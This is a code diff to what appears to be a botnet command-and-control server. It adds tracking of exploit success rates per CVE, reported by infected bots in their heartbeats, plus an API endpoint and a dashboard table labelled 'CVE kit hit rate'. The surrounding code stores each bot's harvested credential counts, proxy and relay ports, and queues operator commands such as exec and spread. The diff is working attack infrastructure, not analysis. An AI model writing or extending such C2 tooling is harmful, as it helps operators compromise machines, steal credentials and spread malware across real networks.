@@ -138,6 +138,38 @@ def _channel_of(fn):
 
 # ─────────────────────────── state store ───────────────────────────
 
+# #160: heartbeat cve_stats format — comma-separated
+# "CVE-YYYY-NNNN:hit|miss|fail=N" triplets (non-zero counters only).
+_CVE_STATS_RE = re.compile(r"(CVE-\d{4}-\d+):(hit|miss|fail)=(\d+)")
+
+
+def parse_cve_stats(raw):
+    """Parse one bot's cve_stats string into {cve_id: {hit,miss,fail}}."""
+    out = {}
+    for m in _CVE_STATS_RE.finditer(raw or ""):
+        cid, kind, n = m.group(1), m.group(2), int(m.group(3))
+        d = out.setdefault(cid, {"hit": 0, "miss": 0, "fail": 0})
+        d[kind] += n
+    return out
+
+
+def cve_rollup(state):
+    """Aggregate every bot's cve_stats into a per-CVE success-rate table:
+    {cve_id: {hit, miss, fail, total, rate}} — rate = hit % of attempts."""
+    roll = {}
+    for (raw,) in state.db.execute(
+            "SELECT cve_stats FROM bots WHERE cve_stats IS NOT NULL"):
+        for cid, d in parse_cve_stats(raw).items():
+            r = roll.setdefault(cid, {"hit": 0, "miss": 0, "fail": 0})
+            for k, v in d.items():
+                r[k] += v
+    for r in roll.values():
+        total = r["hit"] + r["miss"] + r["fail"]
+        r["total"] = total
+        r["rate"] = round(100.0 * r["hit"] / total, 1) if total else 0.0
+    return dict(sorted(roll.items()))
+
+
 SCHEMA = """
 CREATE TABLE IF NOT EXISTS bots (
     hostname    TEXT PRIMARY KEY,
@@ -152,7 +184,8 @@ CREATE TABLE IF NOT EXISTS bots (
     relay_on    INTEGER,
     relay_port  INTEGER,
     channel     TEXT,
-    last_seen   REAL
+    last_seen   REAL,
+    cve_stats   TEXT
 );
 CREATE TABLE IF NOT EXISTS commands (
     id          INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -188,28 +221,41 @@ class State:
     def __init__(self, path):
         self.db = sqlite3.connect(path, check_same_thread=False)
         self.db.executescript(SCHEMA)
+        self._migrate()
         self.db.commit()
         self._lk = threading.Lock()
 
+    def _migrate(self):
+        # #160: cve_stats column on bots (per-CVE hit/miss/fail triplets
+        # reported in heartbeats). CREATE TABLE IF NOT EXISTS covers new
+        # databases; this ALTER covers databases created before the
+        # column existed (idempotent via PRAGMA table_info).
+        cols = {r[1] for r in self.db.execute("PRAGMA table_info(bots)")}
+        if "cve_stats" not in cols:
+            self.db.execute("ALTER TABLE bots ADD COLUMN cve_stats TEXT")
+
     def upsert_bot(self, hb, ip, channel):
         tag = hb.get("tag", "")
+        # #160: comma-separated "CVE-xxxx:kind=N" triplets from the bot;
+        # older bots simply omit the field -> stored as NULL/empty.
+        cve_stats = str(hb.get("cve_stats", "") or "")[:4096]
         with self._lk:
             self.db.execute(
                 """INSERT INTO bots(hostname,tag,ip,version,uptime,scan_count,
-                   cred_count,proxy_on,proxy_port,relay_on,relay_port,channel,last_seen)
-                   VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)
+                   cred_count,proxy_on,proxy_port,relay_on,relay_port,channel,last_seen,cve_stats)
+                   VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)
                    ON CONFLICT(hostname) DO UPDATE SET
                      tag=excluded.tag, ip=excluded.ip, version=excluded.version,
                      uptime=excluded.uptime, scan_count=excluded.scan_count,
                      cred_count=excluded.cred_count, proxy_on=excluded.proxy_on,
                      proxy_port=excluded.proxy_port, relay_on=excluded.relay_on,
                      relay_port=excluded.relay_port, channel=excluded.channel,
-                     last_seen=excluded.last_seen""",
+                     last_seen=excluded.last_seen, cve_stats=excluded.cve_stats""",
                 (hb.get("hostname", ""), tag, ip, hb.get("version", ""),
                  hb.get("uptime", 0), hb.get("scan_count", 0),
                  hb.get("cred_count", 0), hb.get("proxy_on", 0),
                  hb.get("proxy_port", 0), hb.get("relay_on", 0),
-                 hb.get("relay_port", 0), channel, time.time()))
+                 hb.get("relay_port", 0), channel, time.time(), cve_stats))
             self.db.commit()
 
     def record_command(self, target, cmd, args):
@@ -1048,11 +1094,17 @@ class ConsoleHandler(BaseHTTPRequestHandler):
             rows = c2.state.bots()
             cols = ["hostname", "tag", "ip", "version", "uptime", "scan_count",
                     "cred_count", "proxy_on", "proxy_port", "relay_on",
-                    "relay_port", "channel", "last_seen"]
+                    "relay_port", "channel", "last_seen", "cve_stats"]
             bots = [dict(zip(cols, r)) for r in rows]
             for b in bots:
                 b["ago"] = max(0, int(time.time() - (b["last_seen"] or 0)))
             self._send(json.dumps({"bots": bots}), "application/json")
+            return
+        if path == "/api/cve":
+            # #160: per-CVE success rate across the fleet, rolled up
+            # from every bot's heartbeat cve_stats triplets.
+            self._send(json.dumps({"cve": cve_rollup(c2.state)}),
+                       "application/json")
             return
         if path == "/api/security":
             # #195: version-skew observability — a fleet of pre-#173 bots
@@ -1131,6 +1183,9 @@ def console_html():
 <table id="bots"><thead><tr><th>hostname</th><th>tag</th><th>ip</th>
 <th>version</th><th>uptime</th><th>scan</th><th>creds</th><th>proxy</th>
 <th>relay</th><th>channel</th><th>seen (s)</th></tr></thead><tbody></tbody></table>
+<h2>CVE kit hit rate (#160)</h2>
+<table id="cve"><thead><tr><th>cve</th><th>hit</th><th>miss</th><th>fail</th>
+<th>attempts</th><th>success rate</th></tr></thead><tbody></tbody></table>
 <h2>Queue command</h2>
 <form id="qform"><input id="qtarget" placeholder="target tag (empty = any)">
 <input id="qcmd" placeholder="cmd (exec, spread, scan, update...)">
@@ -1158,6 +1213,16 @@ async function refresh(){
  <td>${x.relay_on?'<span class="ok">on '+esc(x.relay_port)+'</span>':'off'}</td>
  <td>${esc(x.channel||'')}</td><td class="${cls}">${x.ago}</td>`;
  tb.appendChild(tr);}
+ // #160: per-CVE hit rate across the fleet (from heartbeat cve_stats)
+ try{
+  const cv=await j('/api/cve');const tc2=document.querySelector('#cve tbody');
+  tc2.innerHTML='';for(const [id,r] of Object.entries(cv.cve||{})){
+   const tr=document.createElement('tr');
+   const cls=r.rate>=50?'ok':'';
+   tr.innerHTML=`<td>${esc(id)}</td><td>${r.hit}</td><td>${r.miss}</td>
+   <td>${r.fail}</td><td>${r.total}</td><td class="${cls}">${r.rate}%</td>`;
+   tc2.appendChild(tr);}
+ }catch(e){}
  const c=await j('/api/commands');const tc=document.querySelector('#cmds tbody');
  tc.innerHTML='';for(const x of c.commands){const tr=document.createElement('tr');
  tr.innerHTML=`<td>${x[0]}</td><td>${esc(x[1]||'')}</td><td>${esc(x[2])}</td>
